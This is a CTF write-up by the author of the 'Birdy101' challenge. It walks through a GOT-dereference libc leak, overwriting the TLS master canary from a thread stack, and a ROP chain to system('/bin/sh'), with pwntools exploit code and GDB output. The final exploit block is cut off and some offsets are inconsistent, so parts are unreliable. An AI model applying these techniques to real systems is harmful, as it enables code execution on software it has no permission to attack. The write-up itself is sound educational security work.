## Challenge Description

## Solution

For AirOverflow CTF 2024, I wrote this Medium-ish challenge.

I provided a `Birdy101.tar`:

```bash
$ tar -tf Birdy101.tar
Birdy101
Dockerfile
Birdy101.c
flag.txt
```

Now normally, when I'm provided with a Dockerfile, I simply use my [script](https://gist.githubusercontent.com/TheFlash2k/50008e1ba8b3e7e6169642e636996e51/raw/cd1cfca56a49e558a46da71d39db6755412f9a18/get-libc-from-dockerfile) to get the libc from Dockerfile and patch the binary to use the libc so that I can get as close to remote as possible.

Once we're done with that, let's check the mitigations on this binary:

![alt text](/static/writeups/aofctf-24/image-1.png)

Okay, so we can see that PIE is disabled and also, we have Partial RELRO, so we can overwrite GOT as well. Let's analyze the code

```c:birdy101.c
// Compile: gcc -o canary101 canary101.c -no-pie -lpthread

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

__attribute__((constructor))
void __constructor__(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    signal(SIGALRM, exit);
    alarm(0x20);
}

void notepad() {
    char buffer[0x100];
    printf("[Under construction] - This section is underconstruction and only allows a single note to be kept in memory\nEnter the contents you want to store: ");
    if(read(STDIN_FILENO, buffer, 0x1000) < 0) {
        fprintf(stderr, "Unable to read the contents of your note. :(");
        exit(1);
    }
    printf("Thank you for storing the note.\n");
}

void register_user() {
    const int SZ = 256;
    char default_user[] = "DEFAULT";
    char buffer[SZ];
    char *name = buffer;
    memset(name, 0x0, SZ);
    printf("What is your name? ");
    if(read(STDIN_FILENO, &name, SZ-1) < 0) {
        name = default_user;
    }
    printf("Welcome %s\n", name);
}

void vuln() {
    pthread_t pt;
    if(pthread_create(&pt, NULL, (void*)notepad, NULL) < 0) {
        fprintf(stderr, "Unable to spawn a new thread. Something's wrong. Please check!");
        exit(1);
    }
    if(pthread_join(pt, NULL) != 0){
        fprintf(stderr, "Well, something's messed up.");
    }
}

int main(int argc, char* argv[], char* envp[]) {
    register_user();
    vuln();
    return 0;
}
```

Now, the source code seems to be pretty simple. Let's start by analyzing the `register_user` function:

```c:register_user
void register_user() {
    const int SZ = 256;
    char default_user[] = "DEFAULT";
    char buffer[SZ];
    char *name = buffer;
    memset(name, 0x0, SZ);
    printf("What is your name? ");
    if(read(STDIN_FILENO, &name, SZ-1) < 0) {
        name = default_user;
    }
    printf("Welcome %s\n", name);
}
```

Now, in this function a 256 size buffer is allocated, then, the address of the buffer is stored in name. After that, we can see that the data at `name` is nulled out because of `memset`. However, if we look at the `read` function call, we can see that the address of name is passed. _Weird_. Normally, you'd pass the variable, which itself is a pointer to `buffer`, but here we're passing the `&name` which is an address on the stack. In the next line, we have a simple: `printf("Welcome %s\n", name);`

### Leaking libc address by dereferencing GOT value

Now, we know that we can write data directly to `name` and when `printf` is called with that name, the `%s` would derefence the data at name and print the value. So, since we know that PIE is disabled, we can simply put the value of `got.printf`, it will dereference the value, and give us a libc leak. Let's write a basic exploit for this:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./Birdy101_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *register_user")

io.sendlineafter(b"name? ", p64(elf.got.printf))
io.interactive()
```

![alt text](/static/writeups/aofctf-24/image-2.png)

Sweet! We can dereference values from the got and we have a libc leak. Let's parse this as well:

```py:exploit.py
io.recvuntil(b"Welcome ")
libc_leak = fixleak(io.recvuntil(b"\n"))
libc.address = libc_leak - libc.sym.printf
print("libc @ %#x" % libc.address)
```

![alt text](/static/writeups/aofctf-24/image-3.png)

Perfect, we have the libc base now. Let's go towards the next stage now.

### Analyzing the remaining functions

```c:vuln
void vuln() {
    pthread_t pt;
    if(pthread_create(&pt, NULL, (void*)notepad, NULL) < 0) {
        fprintf(stderr, "Unable to spawn a new thread. Something's wrong. Please check!");
        exit(1);
    }
    if(pthread_join(pt, NULL) != 0){
        fprintf(stderr, "Well, something's messed up.");
    }
}
```

The vuln function is pretty simple, it just creates a new thread and calls the `notepad` function. Let's see the notepad function:

```c:notepad
void notepad() {
    char buffer[0x100];
    printf("[Under construction] - This section is underconstruction and only allows a single note to be kept in memory\nEnter the contents you want to store: ");
    if(read(STDIN_FILENO, buffer, 0x1000) < 0) {
        fprintf(stderr, "Unable to read the contents of your note. :(");
        exit(1);
    }
    printf("Thank you for storing the note.\n");
}
```

Now, in this function, we note that the Buffer Overflow is pretty obvious. `0x100` size buffer, and we can write `0x1000` bytes. But, the problem is, we don't have any leak for canary.

### Master Canary

Notice how the `notepad` is called inside a thread. Any allocation done within that function will be stored on the `Thread Stack`.

> In threaded functions, the local variables are allocated in an area adjacent to TLS rather than in the main stack used in general/all functions.

The TLS or the `Thread Local Storage` is the place where the Master Canary is stored. The Master Canary is referenced by the `FS+0x28` segment register. Now, the TLS and Thread Stack are adjacent and the TLS is stored at a lower address than the Thread Stack, meaning that in case of an overflow, we can overwrite data into the Master Canary, which is stored at `TLS+0x28`.

### Exploitation

The exploitation requires several steps, which also include bypassing a glibc `2.35` mitigation.

The first step is we need to calculate the distance between our buffer and the canary, which will be stored at `FS+0x28`. To do that, we'll use GDB. Let's disassemble the `notepad` function and find the exact address of our buffer:

```bash:disassembly
pwndbg> disass notepad

   0x00000000004013ab <+162>:   ret
End of assembler dump.
```

Now, we know that the buffer our buffer is `0x100` in side, the stack pointer moves `0x110` to make space for the buffer, and we can see that our buffer is stored at `rbp-0x110` (`0x000000000040133b <+50>:    lea    rax,[rbp-0x110]`)

Here, we'll setup a breakpoint at `notepad+50` to identify the address. Also, we can here the master canary is at `fs:0x28` and on the stack at `rbp-0x8`. Let's find the addresses:

```bash
pwndbg> p $rbp-0x110
$2 = (void *) 0x7f781e33bd40
pwndbg> p/x ($fs_base + 0x28)
$3 = 0x7f781e33c668
pwndbg> p/x ($fs_base + 0x28) - 0x7f781e33bd40
$4 = 0x928
```

Now, we can see that difference between our buffer and the master canary is `0x928`. This offset will always remain constant.

To break down the exploitation path:

- Overflow the buffer and write a canary on the thread stack
- Keep overflowing till `0x928` and write the canary you wrote on the thread stack to `fs:0x28`.

Let's firstly identify the offset, where the stack canary would overwrite. Then, the `canary+0x8` would overwrite RIP. To make it easier, we'd setup a breakpoint at `notepad+154` (just before the `__stack_chk_fail`).

Let's append the following to our exploit:

```py:exploit.py
payload = cyclic(0x150, n=8)
io.sendline(payload)
```

```bash
pwndbg> x/gx $rbp-8
0x7f28380e7e48: 0x6261616161616169
pwndbg> !unhex 6261616161616169 | rev
iaaaaaabpwndbg> cyclic -l iaaaaaab
Finding cyclic pattern of 8 bytes: b'iaaaaaab' (hex: 0x6961616161616162)
Found at offset 264
pwndbg> p/x 264
$1 = 0x108
pwndbg>
```

Now, we can see that after `0x108` bytes, the canary would be overwritten. So, just to make a mental map, our exploit would look something like this:

```py
payload = PADDING_TILL_0x108 + CANARY + <ROP_CHAIN>
payload += "A" * (0x928 - sizeof(payload))
```

Since we have a libc leak, we can do one-gadget, or a simple ret2system. Now since we're overwriting a canary with a known value, we'd overwrite to "A", so we'll just overflow till `0x928`. The updated exploit becomes:

```py:exploit.py
POP_RDI = libc.address + 0x000000000002a3e5
RET = libc.address + 0x0000000000029139
canary = b"AAAAAAAA"
payload = flat(
    cyclic(0x108, n=8),
    canary,
    cyclic(0x8, n=8),
    POP_RDI,
    next(libc.search(b"/bin/sh\x00")),
    RET,
    libc.sym.system
)

payload += flat(
    b"A" * (0x928 - len(payload))
)
io.sendline(payload)
```

Running this with GDB:

![alt text](/static/writeups/aofctf-24/image-4.png)

Our program crashes, and doesn't work as expected. Now, let's dive deep into the libc and see exactly what's causing the issue. I have the libc source at `/opt/glibc-2.35`, you can simply clone it and point GDB to it using `dir` command.

Once done, we'll enable the Text UI mode using `tui enable` in gdb to see exactly the source where our code crashed:

![alt text](/static/writeups/aofctf-24/image-5.png)

Now let's analyze the source code for `__pthread_disable_asynccancel`

```c:nptl/cancellation.c
void
__pthread_disable_asynccancel (int oldtype)
{
  /* If asynchronous cancellation was enabled before we do not have
     anything to do.  */
  if (oldtype == PTHREAD_CANCEL_ASYNCHRONOUS)
    return;
  struct pthread *self = THREAD_SELF;
  self->canceltype = PTHREAD_CANCEL_DEFERRED;
}
```

Now, this function is fairly simple, it checks if the passed argument is `PTHREAD_CANCEL_ASYNCHRONOUS`, if yes; returns. The next thing it does is set the `struct pthread` to `THREAD_SELF`. And then, the `canceltype` attribute of the sturct is set to `PTHREAD_CANCEL_DEFERRED`. This is where our program is crashing. Let's check the definition of `THREAD_SELF`:

```c:sysdeps/x86_64/nptl/tls.h
/* Return the thread descriptor for the current thread. */
#define THREAD_SELF \
  ({ struct pthread *__self;                  \
     asm ("mov %%fs:%c1,%0" : "=r" (__self)             \
    : "i" (offsetof (struct pthread, header.self)));          \
     __self;})
```

So `THREAD_SELF` is a simple macro that declares the `pthread struct` and sets default values. The implementation of `PTHREAD_CANCEL_ASYNCHRONOUS|DEFERRED` are:

```c:sysdeps/nptl/pthread.h
enum
{
  PTHREAD_CANCEL_DEFERRED,
#define PTHREAD_CANCEL_DEFERRED PTHREAD_CANCEL_DEFERRED
  PTHREAD_CANCEL_ASYNCHRONOUS
#define PTHREAD_CANCEL_ASYNCHRONOUS PTHREAD_CANCEL_ASYNCHRONOUS
};
```

These are just simple ENUMS. Now, let's analyze the `pthread` struct in gdb using the following:

```c
(gdb) p *(struct pthread*)$fs_base
```

```bash
pwndbg> p *(struct pthread*)$fs_base                                                                                                                                                                [239/239]
$2 = {
  {
    header = {
      tcb = 0x4141414141414141,
      dtv = 0x4141414141414141,
      self = 0x4141414141414141,
      multiple_threads = 1094795585,
      gscope_flag = 1094795585,
      sysinfo = 4702111234474983745,
      stack_guard = 12175548528710919178,
      pointer_guard = 7228102019232403078,
      unused_vgetcpu_cache = {0, 0},
      feature_1 = 0,
      __glibc_unused1 = 0,
      __private_tm = {0x0, 0x0, 0x0, 0x0},
      __private_ss = 0x0,
      ssp_base = 0,
    ...
```

This will show the entire `pthread*` struct. The only thing that we're interested in is: `self`. Solely because of `self->canceltype = PTHREAD_CANCEL_DEFERRED;`

Now, we need to find the difference of `self` from our buffer at `rbp+0x8`, this offset will always be constant. Let's identify it. For this, we'll setup a breakpoint at `notepad+50` and the since the program will crash, we can easily find the value of `self`.

```bash
pwndbg> p $rbp+0x110
$1 = (void *) 0x7f00d8ca9d40

pwndbg> p &((struct pthread *)$fs_base)->header.self
$2 = (void **) 0x7f00d8caa650

pwndbg> p/x 0x7f00d8caa650-0x7f00d8ca9d40
$3 = 0x910
```

Now, we can see that at `0x910` offset, we can write directly to `self`. Looking back at the crash disassembly:

```bash
pwndbg> x/10i $rip
=> 0x7f00d8d3ea72 <__GI___pthread_disable_asynccancel+18>:      mov    BYTE PTR [rax+0x972],0x0
   0x7f00d8d3ea79 <__GI___pthread_disable_asynccancel+25>:      ret
   0x7f00d8d3ea7a:      nop    WORD PTR [rax+rax*1+0x0]
   0x7f00d8d3ea80 <___pthread_register_cancel>: endbr64
   0x7f00d8d3ea84 <___pthread_register_cancel+4>:       mov    rax,QWORD PTR fs:0x300
   0x7f00d8d3ea8d <___pthread_register_cancel+13>:      mov    QWORD PTR [rdi+0x48],rax
   0x7f00d8d3ea91 <___pthread_register_cancel+17>:      mov    rax,QWORD PTR fs:0x2f8
   0x7f00d8d3ea9a <___pthread_register_cancel+26>:      mov    QWORD PTR [rdi+0x50],rax
   0x7f00d8d3ea9e <___pthread_register_cancel+30>:      mov    QWORD PTR fs:0x300,rdi
   0x7f00d8d3eaa7 <___pthread_register_cancel+39>:      ret
```

We can see that we need to write into `rax`, i.e. `self`, an address; that when dereferenced, would be a writable page:

```bash
0x7f00d8d3ea72 <__GI___pthread_disable_asynccancel+18>:      mov    BYTE PTR [rax+0x972],0x0
```

We can use gdb, and `vmmap` command to find out a writable page. But since PIE is disabled, we can just use the binary's `BSS` section as that will always be writable. To use that in gdb, we can use `elf.bss`

Now, the updated payload becomes:

```py:exploit.py
payload += flat(
    cyclic(0x910 - len(payload), n=8),
    elf.bss(0),
    cyclic(0x972-(0x910-len(payload)), n=8)
)
io.sendline(payload)
```

Now, after running this, we hit the breakpoint that we set before at `__stack_chk_fail`:

![alt text](/static/writeups/aofctf-24/image-6.png)

If we analyze the data at `fs+0x28`:

```bash
pwndbg> x/gx $fs_base+0x28
0x7f3312aeb668: 0x6161616161616163
pwndbg> x/s $fs_base+0x28
0x7f3312aeb668: "caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaab"...
pwndbg> cyclic -l caaaaaaa
Finding cyclic pattern of 8 bytes: b'caaaaaaa' (hex: 0x6361616161616161)
Found at offset 16
```

We can see that at offset `0x10`, we have our master canary. Therefore, the final exploit becomes:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./Birdy101_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()

io.sendlineafter(b"name? ", p64(elf.got.printf))
io.recvuntil(b"Welcome ")

### Weird Thing

The exploit worked absolutely fine on local and inside the container locally. But, I normally use `Ubuntu-20.04` with glibc `2.31`. If I tried my same exploit on remote, it wouldn't work for me. I tried atleast 20-30 times but in vain. **HOWEVER**, if I tried the same exploit on my laptop that had `Arch` with glibc `2.38`, it would work flawlessly. 1/3 times it would spawn a shell on remote. So, if someone can explain the issue to me, as I'm unable to understand why. Even on remote, I was using `ubuntu 22.04` and the challenge was using the same container that I'd deploy locally. And the exploit was working perfectly inside the container. I tried debugging the `pthread` struct on remote, it was giving me the exact same values. I'm using `ynetd` for communication not `socat` otherwise would've understood the bad byte issue. idk. Sometimes it would say `*** stack smashing detected ***: terminated`, other times it would just crash out.

Overall, only a few people were able to solve this challenge, and hope you had fun playing our first international ctf.

GGs.
